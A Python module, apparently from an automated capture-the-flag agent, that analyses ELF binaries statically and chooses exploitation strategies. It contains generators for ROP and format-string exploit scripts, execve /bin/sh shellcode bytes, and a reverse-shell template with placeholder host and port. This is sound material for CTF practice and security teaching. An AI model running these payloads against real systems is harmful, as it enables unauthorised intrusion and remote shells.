"""
Bounded Context: Pwn & Reverse Engineering Domain Solver
Análise estática segura de binários ELF/PE e geração de payloads de exploração.

GARANTIA DE SEGURANÇA:
NUNCA utiliza 'ldd' em binários não confiáveis (previne RCE via ld-linux.so/DT_RPATH).
Utiliza exclusivamente ferramentas de análise estática sem execução (readelf, objdump, file, strings, checksec).
"""
import re
import json
from dataclasses import dataclass
from typing import List, Dict, Any, Optional
from .base import BaseDomainSolver
from .registry import register_solver
from ..dtos.domain_dtos import (
    AnalysisRequest, DomainAnalysisReport, CommandSpec,
    TacticalStrategy, ChecklistTemplate,
)


@dataclass(frozen=True)
class BinaryPath:
    """Value Object puro para validação sintática de caminhos de binários em memória.

    PREMISSA DE RUNTIME: O ambiente de produção do agente é Linux (container Docker / Kaggle).
    INVARIANTE: Zero I/O em __post_init__.
    Rejeita caminhos vazios, null bytes, path traversal ('..') e acessos a diretórios restritos.
    """
    value: str

    def __post_init__(self):
        if not self.value or not self.value.strip():
            raise ValueError("BinaryPath não pode ser vazio")
        if "\x00" in self.value:
            raise ValueError("Null byte injection detectada no caminho")

        normalized = self.value.replace("\\", "/")
        parts = [p for p in normalized.split("/") if p]
        if ".." in parts:
            raise ValueError(f"Path traversal detectado: {self.value!r}")

        if normalized.startswith("//") or self.value.startswith("\\\\"):
            raise ValueError(f"Acesso a caminho UNC de rede bloqueado: {self.value!r}")

        restricted_prefixes = (
            "/etc/", "/proc/", "/sys/", "/dev/", "/var/run/",
            "c:/windows/", "c:/winnt/", "c:/system32/"
        )
        norm_lower = normalized.lower()
        if any(norm_lower.startswith(prefix) for prefix in restricted_prefixes):
            raise ValueError(f"Acesso a caminho de sistema restrito bloqueado: {self.value!r}")


@register_solver("pwn")
@register_solver("rev")
class PwnRevDomainSolver(BaseDomainSolver):
    """Solver especializado em Engenharia Reversa e Binary Exploitation Seguro (sem ldd)."""

    @property
    def domain_type(self) -> str:
        return "pwn"

    # ── Checklist ─────────────────────────────────────────────────────

    def get_checklist(self, binary_path: str = "target_bin") -> List[ChecklistTemplate]:
        return [
            ChecklistTemplate(
                name="File type",
                human_readable_command=f"file {binary_path}",
                description="Detecta tipo ELF/PE/script.",
            ),
            ChecklistTemplate(
                name="Security controls",
                human_readable_command=f"checksec --file={binary_path}",
                description="Detecta NX, Canary, PIE, RELRO.",
            ),
            ChecklistTemplate(
                name="Shared libraries (Static)",
                human_readable_command=f"readelf -d {binary_path}",
                description="Análise estática sem acionar linker. Seguro.",
            ),
            ChecklistTemplate(
                name="ELF symbols",
                human_readable_command=f"readelf -s {binary_path}",
                description="Lista símbolos da tabela de símbolos.",
            ),
            ChecklistTemplate(
                name="Sections",
                human_readable_command=f"readelf -S {binary_path}",
                description="Lista seções do ELF.",
            ),
            ChecklistTemplate(
                name="Dynamic libs",
                human_readable_command=f"readelf --dynamic {binary_path}",
                description="Dependências dinâmicas sem ldd.",
            ),
        ]

    # ── Exploitation Payload Generation ───────────────────────────────

    def generate_pattern(self, length: int) -> str:
        """Generate De Bruijn pattern for offset finding."""
        if length <= 0:
            return ""
        upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        lower = "abcdefghijklmnopqrstuvwxyz"
        digits = "0123456789"
        pattern = ""
        for u in upper:
            for l in lower:
                for d in digits:
                    if len(pattern) >= length:
                        return pattern[:length]
                    pattern += u + l + d
        return pattern[:length]

    def find_pattern_offset(self, value: str) -> Optional[int]:
        """Find offset in De Bruijn pattern for a given value."""
        # Try to extract hex value
        hex_val = value.strip()
        if hex_val.startswith("0x"):
            try:
                addr = int(hex_val, 16)
                # Convert to bytes (little-endian)
                import struct
                try:
                    needle = struct.pack("<Q", addr)[:4]
                except struct.error:
                    needle = struct.pack("<I", addr & 0xFFFFFFFF)
                pattern = self.generate_pattern(2000).encode()
                offset = pattern.find(needle)
                return offset if offset >= 0 else None
            except Exception:
                pass
        return None

    def generate_rop_payload(
        self,
        offset: int,
        ret_addr: int = 0,
        rdi_val: int = 0,
        rsi_val: int = 0,
        rdx_val: int = 0,
        architecture: str = "x86_64",
    ) -> Dict[str, Any]:
        """Generate ROP chain payload template (pwntools-style)."""
        if architecture == "x86_64":
            payload_code = f"""from pwn import *

# Binary exploitation payload
context.binary = './binary'
context.arch = 'amd64'

offset = {offset}
{'ret_addr = ' + hex(ret_addr) if ret_addr else '# Find with: ROPgadget --binary ./binary'}

# Build payload
payload = b'A' * offset
"""
            if ret_addr:
                payload_code += f"payload += p64({hex(ret_addr)})\n"
            if rdi_val:
                payload_code += f"# pop rdi; ret → {hex(rdi_val)}\npayload += p64(pop_rdi) + p64({hex(rdi_val)})\n"
            if rsi_val:
                payload_code += f"# pop rsi; ret → {hex(rsi_val)}\npayload += p64(pop_rsi) + p64({hex(rsi_val)})\n"
            if rdx_val:
                payload_code += f"# pop rdx; ret → {hex(rdx_val)}\npayload += p64(pop_rdx) + p64({hex(rdx_val)})\n"

            payload_code += """
# Send payload
p = process('./binary')
# p = remote('target', port)
p.sendline(payload)
p.interactive()
"""
        else:
            payload_code = f"""from pwn import *

context.binary = './binary'
context.arch = 'i386'

offset = {offset}
payload = b'A' * offset
# Add ret addresses here
p = process('./binary')
p.sendline(payload)
p.interactive()
"""

        return {
            "payload_code": payload_code,
            "offset": offset,
            "architecture": architecture,
            "technique": "rop_chain",
        }

    def generate_format_string_payload(
        self,
        target_addr: int,
        write_value: int,
        offset: int = 6,
        architecture: str = "x86_64",
    ) -> Dict[str, Any]:
        """Generate format string exploit payload for GOT overwrite."""
        # Build write primitive using %n
        payload_parts = []

        # Write byte by byte
        bytes_to_write = []
        for i in range(4 if architecture == "i386" else 8):
            byte_val = (write_value >> (i * 8)) & 0xFF
            bytes_to_write.append((target_addr + i, byte_val))

        bytes_to_write.sort(key=lambda x: x[1])

        written = 0
        addresses = b""
        fmt = b""

        for i, (addr, val) in enumerate(bytes_to_write):
            pad = val - written
            if pad < 0:
                pad += 256
            fmt += f"%{pad}c%{offset + i}$hhn".encode()
            addresses += addr.to_bytes(8 if architecture == "x86_64" else 4, "little")
            written = val

        payload_code = f"""from pwn import *

context.binary = './binary'
context.arch = '{"amd64" if architecture == "x86_64" else "i386"}'

target_addr = {hex(target_addr)}
write_value = {hex(write_value)}
offset = {offset}

# Format string: write to target_addr using %n
# Adjust padding and offset based on stack layout
payload = {repr(fmt)} + {repr(addresses)}

p = process('./binary')
p.sendline(payload)
p.interactive()
"""

        return {
            "payload_code": payload_code,
            "target_addr": hex(target_addr),
            "write_value": hex(write_value),
            "technique": "format_string",
        }

    def generate_shellcode(self, shell_type: str = "execve", arch: str = "x86_64") -> Dict[str, Any]:
        """Generate shellcode templates."""
        templates = {
            "x86_64": {
                "execve": {
                    "assembly": """
; execve("/bin/sh", ["/bin/sh"], NULL)
xor    rsi, rsi        ; argv = NULL
push   rsi             ; null terminator
mov    rdi, 0x68732f6e69622f ; "/bin/sh"
push   rdi
mov    rdi, rsp        ; rdi = pointer to "/bin/sh"
xor    rdx, rdx        ; envp = NULL
mov    al, 0x3b        ; syscall: execve
syscall
""",
                    "shellcode": "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05",
                    "bytes": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xd2\xb0\x3b\x0f\x05",
                },
                "reverse_shell": {
                    "pwntools": f"shellcraft.connectsh('{chr(123)}lhost{chr(125)}', {chr(123)}lport{chr(125)})",
                    "note": "Use pwntools for dynamic generation with LHOST/LPORT",
                },
            },
            "x86": {
                "execve": {
                    "assembly": """
; execve("/bin/sh", ["/bin/sh"], NULL)
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
push   eax
push   ebx
mov    ecx, esp
xor    edx, edx
mov    al, 0x0b
int    0x80
""",
                    "shellcode": "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80",
                },
            },
        }

        arch_templates = templates.get(arch, templates.get("x86_64", {}))
        result = arch_templates.get(shell_type, arch_templates.get("execve", {}))

        return {
            "architecture": arch,
            "shell_type": shell_type,
            "template": result,
            "bad_chars": ["\\x00", "\\x0a", "\\x0d", "\\x20"],
            "encoder_note": "Use msfvenom -b to avoid bad chars, or pwntools encoder",
        }

    def evaluate_tactical_strategy(self, security_controls: Dict[str, bool]) -> TacticalStrategy:
        """Motor de regras de decisão de domínio tático baseado nos controles de segurança.

        Cobre os 4 quadrantes da matriz de segurança (NX, Canary, PIE):
        - Quadrante 1: NX=False -> SHELLCODE_INJECTION
        - Quadrante 2: NX=True, Canary=False -> RET2LIBC_STACK_OVERFLOW
        - Quadrante 3: NX=True, Canary=True, PIE=False -> ROP_FIXED_BINARY_BASE
        - Quadrante 4: NX=True, Canary=True, PIE=True -> LEAK_CANARY_AND_ROP
        """
        nx = security_controls.get("NX", True)
        canary = security_controls.get("Canary", True)
        pie = security_controls.get("PIE", True)

        if not nx:
            return TacticalStrategy(
                strategy_name="SHELLCODE_INJECTION",
                target_vulnerability="Executable Stack (No NX)",
                prerequisites=["shellcode_payload", "buffer_offset"],
                confidence=0.95,
            )
        elif nx and not canary:
            return TacticalStrategy(
                strategy_name="RET2LIBC_STACK_OVERFLOW",
                target_vulnerability="Stack Buffer Overflow without Canary",
                prerequisites=["libc_base_leak", "system_address"],
                confidence=0.9,
            )
        elif nx and canary and not pie:
            return TacticalStrategy(
                strategy_name="ROP_FIXED_BINARY_BASE",
                target_vulnerability="Stack Protection with Fixed Binary Base (PIE disabled)",
                prerequisites=["canary_leak_primitive", "libc_leak_via_plt"],
                confidence=0.85,
            )
        else:
            return TacticalStrategy(
                strategy_name="LEAK_CANARY_AND_ROP",
                target_vulnerability="Full Protections Enabled (Canary + PIE)",
                prerequisites=["canary_leak_primitive", "rop_gadgets"],
                confidence=0.7,
            )

    # ── Tournament & Analysis ─────────────────────────────────────────

    def solve_tactical_step(self, metadata: Dict[str, Any]) -> "TournamentResult[CommandSpec]":
        """Gera, sanitiza e ranqueia hipóteses táticas de análise de binários via Torneio Elo."""
        from .hypothesis import Hypothesis, TournamentResult

        target = str(metadata.get("target_resource", "target_bin"))

        hypotheses = [
            Hypothesis(
                id="hyp_file",
                name="Identificação de Tipo de Arquivo",
                payload=CommandSpec(binary="file", args=[target]),
                initial_score=0.95,
            ),
            Hypothesis(
                id="hyp_checksec",
                name="Verificação de Controles de Segurança",
                payload=CommandSpec(binary="checksec", args=[f"--file={target}"]),
                initial_score=0.99,
            ),
            Hypothesis(
                id="hyp_readelf_sections",
                name="Análise de Seções ELF",
                payload=CommandSpec(binary="readelf", args=["-S", target]),
                initial_score=0.8,
            ),
            Hypothesis(
                id="hyp_readelf_symbols",
                name="Extração de Símbolos ELF",
                payload=CommandSpec(binary="readelf", args=["-s", target]),
                initial_score=0.85,
            ),
            Hypothesis(
                id="hyp_readelf_dynamic",
                name="Dependências Dinâmicas",
                payload=CommandSpec(binary="readelf", args=["--dynamic", target]),
                initial_score=0.7,
            ),
            Hypothesis(
                id="hyp_strings",
                name="Extração de Strings Suspeitas",
                payload=CommandSpec(binary="strings", args=[target]),
                initial_score=0.6,
            ),
            Hypothesis(
                id="hyp_objdump",
                name="Desmontagem de Código",
                payload=CommandSpec(binary="objdump", args=["-d", target]),
                initial_score=0.65,
            ),
        ]

        from .engine import TacticalHypothesisEngine
        engine = metadata.get("_engine") or TacticalHypothesisEngine()
        return engine.run_tournament(hypotheses, context=metadata)

    def analyze(self, request: AnalysisRequest) -> DomainAnalysisReport:
        # 1. Validação Sintática de Domínio (Value Object em memória)
        try:
            target = BinaryPath(request.target_resource)
        except ValueError as exc:
            return DomainAnalysisReport(
                domain=self.domain_type,
                success=False,
                errors=[f"INVALID_TARGET: {exc}"],
                metadata={"target": request.target_resource},
            )

        # 2. Verificação de Existência via Porta FileReaderPort
        if not self.file_reader.exists(target.value):
            return DomainAnalysisReport(
                domain=self.domain_type,
                success=False,
                errors=[f"FILE_NOT_FOUND: Arquivo não encontrado: {target.value!r}"],
                metadata={"target": request.target_resource},
            )

        # 3. Verificação de Cabeçalho/Magic Bytes via Porta FileReaderPort
        try:
            header = self.file_reader.read_header(target.value, 4)
            if header != b"\x7fELF":
                return DomainAnalysisReport(
                    domain=self.domain_type,
                    success=False,
                    errors=[f"INVALID_FORMAT: Arquivo não é ELF (magic={header!r})"],
                    metadata={"target": request.target_resource},
                )
        except Exception as exc:
            return DomainAnalysisReport(
                domain=self.domain_type,
                success=False,
                errors=[f"READ_ERROR: Falha ao ler cabeçalho: {exc}"],
                metadata={"target": request.target_resource},
            )

        # 4. Análise multi-fase
        observations = []
        errors = []
        metadata: Dict[str, Any] = {"target": request.target_resource}

        # Phase 1: checksec
        checksec_result = self.executor.execute(CommandSpec(
            binary="checksec", args=[f"--file={target.value}"], timeout=15
        ))
        if checksec_result.success:
            observations.append(f"Security controls: {checksec_result.output}")
            # Parse security controls
            controls: Dict[str, bool] = {}
            for key in ["NX", "PIE", "RELRO"]:
                if key in checksec_result.output:
                    val = re.search(rf"{key}\s*:\s*(\S+)", checksec_result.output)
                    if val:
                        v = val.group(1).lower()
                        if key == "NX":
                            controls["NX"] = v not in ("no", "disabled", "nx disabled")
                        elif key == "PIE":
                            controls["PIE"] = v not in ("no", "disabled")
                        elif key == "RELRO":
                            controls["Full_RELRO"] = "full" in v
            if "Stack" in checksec_result.output and "Canary" in checksec_result.output:
                controls["Canary"] = True
            elif "Stack" in checksec_result.output:
                controls["Canary"] = "canary" in checksec_result.output.lower()
            metadata["security_controls"] = controls

            # Determine strategy
            strategy = self.evaluate_tactical_strategy(controls)
            metadata["strategy"] = {
                "name": strategy.strategy_name,
                "vulnerability": strategy.target_vulnerability,
                "prerequisites": strategy.prerequisites,
                "confidence": strategy.confidence,
            }
            observations.append(f"Recommended strategy: {strategy.strategy_name} (confidence: {strategy.confidence})")
        else:
            errors.append(f"checksec failed: {checksec_result.error}")

        # Phase 2: readelf for symbols
        symbols_result = self.executor.execute(CommandSpec(
            binary="readelf", args=["-s", target.value], timeout=15
        ))
        if symbols_result.success:
            # Look for interesting functions
            interesting = ["main", "win", "flag", "shell", "secret", "backdoor", "admin"]
            found_funcs = []
            for line in symbols_result.output.split('\n'):
                for func in interesting:
                    if func in line.lower() and 'FUNC' in line:
                        found_funcs.append(line.strip())
            if found_funcs:
                metadata["interesting_functions"] = found_funcs
                observations.append(f"Interesting functions found: {[f.split()[-1] for f in found_funcs[:5]]}")

        # Phase 3: strings for flags/secrets
        strings_result = self.executor.execute(CommandSpec(
            binary="strings", args=[target.value], timeout=15
        ))
        if strings_result.success:
            flag_matches = re.findall(r'(flag\{[^}]+\}|CTF\{[^}]+\}|secret\w*)', strings_result.output, re.IGNORECASE)
            if flag_matches:
                metadata["strings_flags"] = flag_matches
                observations.append(f"Flags/secrets in strings: {flag_matches[:3]}")

        return DomainAnalysisReport(
            domain=self.domain_type,
            success=len(errors) == 0,
            observations=observations,
            errors=errors,
            metadata=metadata,
        )
